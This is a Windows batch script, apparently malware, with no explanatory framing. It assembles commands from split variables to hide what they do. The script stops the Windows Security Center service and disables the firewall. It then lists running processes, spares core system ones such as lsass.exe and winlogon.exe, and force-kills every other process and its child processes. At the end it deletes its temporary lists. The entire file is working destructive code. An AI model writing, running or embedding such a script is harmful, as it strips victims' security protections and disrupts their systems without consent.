@ECHO OFF

set spawn=net
set satan=stop
set crea=Secu
set tions=rity
set dot=Cen
set teak=ter
set dev=opm
set ill=ode
set smo=fir
set key=ewall
set shack=mode
set death=disa
set monkey=ble


%spawn% %satan% %crea%%tions% %dot%%teak%
%spawn%sh %smo%%key% set %dev%%ill% %shack%=%death%%monkey%

:::::::::::::::::::::::::::::::;:::::::::::::::::::::::::::::::::::::::::::::::::
FOR /F "skip=3 tokens=1" %%X IN ('TASKLIST /M^| FIND "."') DO ECHO %%X >>TList1
FIND /V "dll"<TList1>>TList2
FIND /V "DLL"<TList2>>TList3
:::::::::::::::::::::::::::::::;:::::::::::::::::::::::::::::::::::::::::::::::::




FIND /V "services.exe"<TList3>>TList4
FIND /V "lsass.exe"<TList4>>TList5
FIND /V "svchost.exe"<TList5>>TList6
FIND /V "winlogon.exe"<TList6>>TList7
FIND /V "explorer.exe"<TList7>>TList8
FIND /V "System.exe"<TList8>>TList9
FIND /V "smss.exe"<TList9>>TList10
FIND /V "csrss.exe"<TList10>>TList11
FIND /V "cmd.exe"<TList11>>TList12



:::::::::::::::::::::::::::::::;:::::::::::::::::::::::::::::::::::::::::::::::::
FOR /F %%Y IN (TList12) DO (TASKKILL /IM %%Y /F)
FOR /F %%Y IN (TList12) DO (TASKKILL /T /IM %%Y /F)
DEL /Q /S /F \TList* 
:::::::::::::::::::::::::::::::;:::::::::::::::::::::::::::::::::::::::::::::::::


Exit



